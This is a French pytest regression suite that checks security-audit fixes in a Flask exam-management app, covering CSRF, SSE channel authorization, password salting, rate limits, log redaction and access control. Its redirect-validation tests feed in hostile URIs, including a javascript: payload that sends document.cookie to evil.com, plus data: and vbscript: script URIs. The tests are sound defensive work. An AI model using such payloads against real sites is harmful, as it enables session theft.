"""
Tests de non-régression pour les corrections de l'audit de sécurité.

Chaque classe couvre un constat précis de l'audit et vérifie que la
correction appliquée est bien en place — l'objectif est qu'une régression
future (ex. suppression accidentelle de `CSRFProtect`, d'une autorisation de
canal SSE, ou d'une limite de débit) fasse échouer la suite de tests.
"""

import ast
from pathlib import Path

import pytest

APP_PY = Path(__file__).resolve().parents[2] / "webserver" / "app.py"


def _route_function(name: str) -> ast.FunctionDef:
    tree = ast.parse(APP_PY.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == name:
            return node
    raise AssertionError(f"Fonction introuvable : {name}")


def _decorator_names(func: ast.FunctionDef) -> list[str]:
    names = []
    for dec in func.decorator_list:
        target = dec.func if isinstance(dec, ast.Call) else dec
        names.append(ast.unparse(target))
    return names


# ── #1 — Protection CSRF ──────────────────────────────────────────────────────

class TestCSRFProtection:
    """`CSRFProtect` doit être enregistré globalement (avant : jamais appelé,
    les jetons rendus dans les formulaires n'étaient jamais vérifiés)."""

    def test_csrf_extension_registered(self, flask_app):
        assert "csrf" in flask_app.extensions, (
            "CSRFProtect(app) doit être enregistré sur l'application "
            "(sinon les jetons csrf_token rendus ne sont jamais validés)"
        )

    def test_post_without_token_is_rejected_when_csrf_enabled(self, flask_app):
        """Avec WTF_CSRF_ENABLED=True, un POST sans jeton doit être refusé (400)."""
        previous = flask_app.config["WTF_CSRF_ENABLED"]
        flask_app.config["WTF_CSRF_ENABLED"] = True
        try:
            with flask_app.test_client() as c:
                with c.session_transaction() as sess:
                    sess["user"] = "admin"
                r = c.post("/gestion/reload-pages", data={"link_back": "/gestion"})
                assert r.status_code == 400
        finally:
            flask_app.config["WTF_CSRF_ENABLED"] = previous


# ── #2 — Actions mutantes accessibles uniquement en POST ─────────────────────

class TestStateChangingRoutesRequirePost:
    """`delete_examinateur`/`reload_pages` ne doivent plus être déclenchables
    par une simple navigation GET (vecteur de CSRF-par-lien malgré
    SameSite=Lax sur les navigations de premier niveau)."""

    @pytest.mark.parametrize("path", ["/gestion/delete-examinateur", "/gestion/reload-pages"])
    def test_get_is_not_allowed(self, admin_client, path):
        r = admin_client.get(path)
        assert r.status_code == 405

    @pytest.mark.parametrize("name", ["delete_examinateur", "reload_pages"])
    def test_route_declares_post_only(self, name):
        func = _route_function(name)
        route_dec = next(d for d in func.decorator_list if isinstance(d, ast.Call))
        methods = next(
            kw.value for kw in route_dec.keywords if kw.arg == "methods"
        )
        declared = {ast.literal_eval(elt) for elt in methods.elts}
        assert declared == {"POST"}, f"{name} doit être déclarée POST uniquement, trouvé {declared}"


# ── #3 — Autorisation par canal SSE ───────────────────────────────────────────

class TestSSEChannelAuthorization:
    """`_sse_channel_allowed` doit empêcher un utilisateur de s'abonner aux
    canaux d'autrui (IDOR identifié dans l'audit : un candidat pouvait lire
    les numéros d'autres candidats via `/stream?channel=candidat_<autre_numero>`)."""

    def _allowed(self, flask_app, session_data, channel):
        from app import _sse_channel_allowed
        with flask_app.test_request_context():
            from flask import session
            session.update(session_data)
            return _sse_channel_allowed(channel)

    def test_admin_can_subscribe_to_anything(self, flask_app):
        assert self._allowed(flask_app, {"user": "admin"}, "candidat_0123456789A")
        assert self._allowed(flask_app, {"user": "admin"}, "salle_101")
        assert self._allowed(flask_app, {"user": "admin"}, "algo_output")

    def test_general_is_open_to_any_authenticated_session(self, flask_app):
        assert self._allowed(flask_app, {"candidat": "0123456789A"}, "general")
        assert self._allowed(flask_app, {"loge": "Loge A"}, "general")
        assert self._allowed(flask_app, {"user": "101"}, "general")

    def test_candidat_cannot_subscribe_to_another_candidat_channel(self, flask_app):
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "candidat_OTHER_INE")

    def test_candidat_can_subscribe_to_own_channel(self, flask_app):
        assert self._allowed(flask_app, {"candidat": "0123456789A"}, "candidat_0123456789A")

    def test_examinateur_can_subscribe_to_any_salle_channel(self, flask_app):
        """Les routes salle()/loge() laissent déjà le personnel consulter
        n'importe quelle fiche (is_authenticated()) : l'autorisation SSE doit
        suivre la même règle, sinon le flux temps réel reste bloqué (403) dès
        qu'un examinateur regarde une salle qui n'est pas la sienne."""
        assert self._allowed(flask_app, {"user": "101"}, "salle_101")
        assert self._allowed(flask_app, {"user": "101"}, "salle_999")

    def test_loge_user_can_subscribe_to_any_loge_or_salle_channel(self, flask_app):
        assert self._allowed(flask_app, {"loge": "Loge A"}, "loge_Loge A")
        assert self._allowed(flask_app, {"loge": "Loge A"}, "loge_Loge B")
        assert self._allowed(flask_app, {"loge": "Loge A"}, "salle_101")

    def test_candidat_cannot_subscribe_to_salle_or_loge_channel(self, flask_app):
        """Seul le personnel (examinateur, loge, admin) consulte les fiches
        salle/loge — un candidat n'a aucune raison d'y être abonné."""
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "salle_101")
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "loge_Loge A")

    def test_non_admin_cannot_subscribe_to_algo_output(self, flask_app):
        assert not self._allowed(flask_app, {"user": "101"}, "algo_output")
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "algo_output")

    def test_unknown_channel_denied_by_default(self, flask_app):
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "sse")
        assert not self._allowed(flask_app, {"candidat": "0123456789A"}, "anything-else")


# ── #3bis — Pas de donnée personnelle sur le canal général ───────────────────

class TestNoPersonalDataOnGeneralChannel:
    """`edit_oral` ne doit plus diffuser l'INE sur le canal `general`, ouvert
    à tous les rôles authentifiés (candidats compris)."""

    def test_general_publish_carries_no_ine(self):
        source = APP_PY.read_text(encoding="utf-8")
        # La diffusion vers 'general' doit utiliser une charge utile vide,
        # jamais la variable contenant le numéro de candidat.
        assert "sse.publish(data='', type=\"data_updated\", channel='general')" in source
        assert "sse.publish(data=numero, type=\"data_updated\", channel='general')" not in source


# ── #4 — Hachage des mots de passe ────────────────────────────────────────────

class TestPasswordHashing:
    """Le schéma généré par `setup_new_site.generate_app_secrets` doit dériver
    un sel propre à chaque identifiant (avant : sel statique partagé par
    toute l'instance — deux comptes avec le même mot de passe produisaient le
    même hash, et une table arc-en-ciel ciblant le sel unique restait valable
    pour tous les comptes)."""

    @pytest.fixture(scope="class")
    def secrets_module(self):
        import sys
        sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
        from setup_new_site import generate_app_secrets
        content, _ = generate_app_secrets(
            fqdn="stex.example.org", centre="Lycée Test",
            db_user="user", db_password="pass", db_name="db",
        )
        ns: dict = {}
        exec(compile(content, "<app_secrets>", "exec"), ns)
        return ns

    def test_same_password_different_identifiers_yield_different_hashes(self, secrets_module):
        h1 = secrets_module["hash_password"]("MotDePasse123", "0123456789A")
        h2 = secrets_module["hash_password"]("MotDePasse123", "0123456789B")
        assert h1 != h2

    def test_check_password_round_trips_with_identifier(self, secrets_module):
        h = secrets_module["hash_password"]("MotDePasse123", "0123456789A")
        assert secrets_module["check_password"]("MotDePasse123", "0123456789A", h)

    def test_check_password_rejects_mismatched_identifier(self, secrets_module):
        h = secrets_module["hash_password"]("MotDePasse123", "0123456789A")
        assert not secrets_module["check_password"]("MotDePasse123", "0123456789B", h)

    def test_scrypt_cost_increased(self):
        from setup_new_site import generate_app_secrets
        content, _ = generate_app_secrets(
            fqdn="stex.example.org", centre="Lycée Test",
            db_user="user", db_password="pass", db_name="db",
        )
        assert "n=2048" not in content
        assert "n=2 ** 15" in content

    def test_generated_password_length_increased(self, secrets_module):
        assert len(secrets_module["generate_password"]()) == 12


# ── #5 — Limitation de débit homogène sur les routes de connexion ────────────

class TestLoginRateLimiting:
    """Toutes les routes de connexion doivent porter une limite explicite —
    avant, seule `login_loge` était protégée (10/minute), les autres
    s'appuyaient sur les seules limites globales bien plus permissives."""

    @pytest.mark.parametrize("name", [
        "login", "login_examinateur", "login_candidat", "login_loge",
    ])
    def test_route_has_explicit_rate_limit(self, name):
        func = _route_function(name)
        decorators = _decorator_names(func)
        assert "limiter.limit" in decorators, (
            f"{name} doit porter un @limiter.limit(...) explicite, trouvé {decorators}"
        )


class TestAuthFailureCleanup:
    """`_auth_failures` doit être purgé des IP sans échec récent — sinon le
    dictionnaire grossit indéfiniment en mémoire (fuite) jusqu'au redémarrage."""

    def test_stale_entries_are_purged(self, flask_app, monkeypatch):
        from app import _auth_failures, _record_auth_failure
        _auth_failures.clear()

        import time as time_module
        # Première IP : échec "vieux" de 10 minutes (hors fenêtre de 5 min)
        with flask_app.test_request_context(environ_base={"REMOTE_ADDR": "10.0.0.1"}):
            monkeypatch.setattr(time_module, "time", lambda: 1_000_000.0)
            _record_auth_failure("test", "x")

        # Deuxième IP : échec récent → déclenche la purge des entrées obsolètes
        with flask_app.test_request_context(environ_base={"REMOTE_ADDR": "10.0.0.2"}):
            monkeypatch.setattr(time_module, "time", lambda: 1_000_000.0 + 600)
            _record_auth_failure("test", "y")

        assert "10.0.0.1" not in _auth_failures, "L'entrée obsolète doit être purgée"
        assert "10.0.0.2" in _auth_failures
        _auth_failures.clear()


# ── #6 — XSS latent (repr + |safe) ────────────────────────────────────────────

class TestNoUnsafeJsonInjection:
    """`students_numeros` doit être sérialisé via `tojson` (échappement HTML/JS
    correct) — l'ancien `repr(...) | safe` n'échappait pas les caractères
    spéciaux et aurait permis une injection si une valeur en contenait."""

    def test_no_repr_safe_pattern_in_app(self):
        source = APP_PY.read_text(encoding="utf-8")
        assert "repr(item['numero'])" not in source

    @pytest.mark.parametrize("template", ["loge.html", "salle.html"])
    def test_templates_use_tojson(self, template):
        path = APP_PY.parent / "templates" / template
        content = path.read_text(encoding="utf-8")
        assert "students_numeros | tojson" in content
        assert "students_numeros | safe" not in content


# ── #7 — Pas de secret en clair dans les logs ─────────────────────────────────

class TestSecretRedactionInLogs:
    """Les tokens de signature (accès temporaire NON authentifié) ne doivent
    plus apparaître en clair dans les logs applicatifs, et le code OTP soumis
    ne doit plus être journalisé lors d'un échec de connexion admin."""

    def test_redact_token_truncates(self):
        from app import _redact_token
        token = "abcdefghijklmnopqrstuvwxyz0123456789"
        redacted = _redact_token(token)
        assert redacted != token
        assert token[:6] in redacted
        assert token[10:] not in redacted

    def test_redact_token_handles_empty(self):
        from app import _redact_token
        assert _redact_token("") == ""

    def test_no_raw_token_interpolation_in_logs(self):
        source = APP_PY.read_text(encoding="utf-8")
        assert "({tk})" not in source
        assert "({token})" not in source
        assert "({res['token']})" not in source

    def test_otp_code_not_logged_on_failure(self):
        source = APP_PY.read_text(encoding="utf-8")
        assert "code={passcode}" not in source


# ── #8 — Fiabilité de la chaîne de hash des logs d'audit ──────────────────────

# ── #9 — _safe_redirect_url rejette les schémas dangereux ────────────────────

class TestSafeRedirectUrl:
    """Vuln audit : `_safe_redirect_url` ne vérifiait que `netloc`, laissant
    passer `javascript:` et `data:` (netloc vide). La correction ajoute un
    allowlist de schémas (`http`, `https`, chemin relatif)."""

    def _check(self, flask_app, url):
        from app import _safe_redirect_url
        with flask_app.test_request_context("/", headers={"Host": "localhost"}):
            return _safe_redirect_url(url)

    def test_javascript_uri_rejected(self, flask_app):
        assert self._check(flask_app, "javascript:alert(1)") is None

    def test_javascript_uri_with_payload_rejected(self, flask_app):
        assert self._check(flask_app, "javascript:fetch('https://evil.com?c='+document.cookie)") is None

    def test_data_uri_rejected(self, flask_app):
        assert self._check(flask_app, "data:text/html,<script>alert(1)</script>") is None

    def test_vbscript_uri_rejected(self, flask_app):
        assert self._check(flask_app, "vbscript:msgbox(1)") is None

    def test_relative_path_accepted(self, flask_app):
        assert self._check(flask_app, "/gestion") == "/gestion"

    def test_same_host_http_accepted(self, flask_app):
        assert self._check(flask_app, "http://localhost/gestion") == "http://localhost/gestion"

    def test_external_host_rejected(self, flask_app):
        assert self._check(flask_app, "https://evil.com/steal") is None

    def test_none_and_empty_return_none(self, flask_app):
        assert self._check(flask_app, None) is None
        assert self._check(flask_app, "") is None
        assert self._check(flask_app, "None") is None


# ── #10 — PDFs candidats protégés par authentification ────────────────────────

class TestCandidatPdfAccessControl:
    """Vuln audit : la route `/download` servait les fichiers `candidat_*.pdf`
    sans aucune authentification. Ces PDFs contiennent le nom, le numéro de candidat, le
    planning d'oraux et les identifiants de connexion du candidat."""

    def test_candidat_pdf_denied_without_session(self, client):
        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
                       follow_redirects=False)
        assert r.status_code == 403

    def test_candidat_pdf_accessible_with_admin_session(self, admin_client):
        r = admin_client.get("/download?filename=candidat_Martin_Paul.pdf",
                             follow_redirects=False)
        # Le fichier n'existe pas en test → 404, mais PAS 403
        assert r.status_code != 403

    def test_candidat_pdf_accessible_with_candidat_session(self, client, flask_app):
        with client.session_transaction() as sess:
            sess["candidat"] = "111111111AA"
        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
                       follow_redirects=False)
        assert r.status_code != 403

    def test_candidat_pdf_accessible_with_examinateur_session(self, client, db_mock):
        db_mock.make_sql_select.return_value = [{"nom": "Martin", "password_hash": "x",
                                                  "salle": "101"}]
        with client.session_transaction() as sess:
            sess["user"] = "101"
        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
                       follow_redirects=False)
        assert r.status_code != 403

    def test_papillons_pdf_still_requires_admin(self, client):
        r = client.get("/download?filename=papillons_candidats.pdf",
                       follow_redirects=False)
        assert r.status_code == 403

    def test_other_pdf_still_requires_authentication(self, client):
        r = client.get("/download?filename=liste_oraux.pdf",
                       follow_redirects=False)
        # Sans session → redirect vers login (302) ou 403, jamais 200
        assert r.status_code in (302, 403)


# ── #11 — Triggers DB sans password_hash ─────────────────────────────────────

class TestTriggerNoPasswordHash:
    """Vuln audit : les triggers INSERT/UPDATE/DELETE sur la table Examinateur
    incluaient `password_hash` dans le JSON loggé vers la table Logs. Ce hash
    scrypt se retrouvait ensuite dans l'archive RGPD (journal_audit.json),
    en contradiction avec la politique déclarée d'exclusion des mots de passe."""

    @pytest.fixture(scope="class")
    def trigger_sql(self):
        source = (Path(__file__).resolve().parents[2]
                  / "db_facility_save.py").read_text(encoding="utf-8")
        # Extraire uniquement les blocs de triggers Examinateur
        import re
        return "\n".join(
            m.group(0)
            for m in re.finditer(
                r'CREATE TRIGGER (after_insert_Examinateur|after_update_Examinateur'
                r'|after_delete_Examinateur).*?END',
                source, re.DOTALL,
            )
        )

    def test_insert_trigger_has_no_password_hash(self, trigger_sql):
        assert "password_hash" not in trigger_sql, (
            "Les triggers Examinateur ne doivent pas logger password_hash "
            "(présent dans l'archive RGPD via journal_audit.json)"
        )

    def test_triggers_still_log_essential_fields(self, trigger_sql):
        for field in ("nom", "salle", "loge", "matiere"):
            assert field in trigger_sql, f"Le champ '{field}' doit rester dans les triggers"


ROOT_DIR = APP_PY.resolve().parents[1]
DB_FACILITY_SAVE_PY = ROOT_DIR / "db_facility_save.py"


class TestLogIntegrityChain:
    """La vérification de la chaîne de hash des logs (route /gestion/verify-logs
    et verify_logs.py) suppose un parcours strictement séquentiel par id, où
    chaque hash dépend du hash de l'entrée précédente. Deux défauts pouvaient
    produire de faux positifs de « chaîne compromise » :
    - SELECT_ALL_LOGS ne triait pas par id (ordre de lecture non garanti) ;
    - log_action lisait le dernier hash sans verrou, exposant la chaîne à une
      course entre triggers déclenchés par des écritures concurrentes."""

    def test_select_all_logs_orders_by_id(self):
        from db_facility_web import SELECT_ALL_LOGS
        assert "ORDER BY id" in SELECT_ALL_LOGS, (
            "SELECT_ALL_LOGS doit trier par id pour que la vérification "
            "séquentielle de la chaîne de hash soit fiable"
        )

    def test_log_action_locks_last_hash_row(self):
        source = DB_FACILITY_SAVE_PY.read_text(encoding="utf-8")
        proc_start = source.index("CREATE PROCEDURE log_action")
        proc = source[proc_start:proc_start + 800]
        assert "FOR UPDATE" in proc, (
            "log_action doit verrouiller la dernière ligne de Logs (FOR UPDATE) "
            "pour empêcher deux triggers concurrents de chaîner sur le même hash"
        )

    def test_verify_logs_route_checks_in_id_order_with_chained_hashes(
            self, admin_client, db_mock, monkeypatch):
        """La route doit vérifier chaque entrée avec le hash de la précédente,
        dans l'ordre renvoyé par SELECT_ALL_LOGS (désormais trié par id)."""
        import app as app_module

        logs = [
            {"id": 1, "action_data": "{}", "table_name": "Candidat", "hash": "h1"},
            {"id": 2, "action_data": "{}", "table_name": "Candidat", "hash": "h2"},
            {"id": 3, "action_data": "{}", "table_name": "Candidat", "hash": "h3"},
        ]
        db_mock.make_sql_select.return_value = logs

        seen = []

        def _spy(log_item, previous_hash=""):
            seen.append((log_item["id"], previous_hash))
            return True

        monkeypatch.setattr(app_module, "verify_log_item", _spy)

        r = admin_client.get("/gestion/verify-logs")
        assert r.status_code == 200
        assert seen == [(1, ""), (2, "h1"), (3, "h2")], (
            "Chaque entrée doit être vérifiée avec le hash de l'entrée "
            "précédente par id, en commençant par une chaîne vide"
        )

    def test_verify_logs_route_reports_compromised_on_mismatch(
            self, admin_client, db_mock, monkeypatch):
        import app as app_module

        logs = [
            {"id": 1, "action_data": "{}", "table_name": "Candidat", "hash": "h1"},
            {"id": 2, "action_data": "{}", "table_name": "Candidat", "hash": "BAD"},
        ]
        db_mock.make_sql_select.return_value = logs
        monkeypatch.setattr(
            app_module, "verify_log_item",
            lambda log_item, previous_hash="": log_item["hash"] != "BAD",
        )

        r = admin_client.get("/gestion/verify-logs")
        assert r.status_code == 200
        assert "❌" in r.get_data(as_text=True)
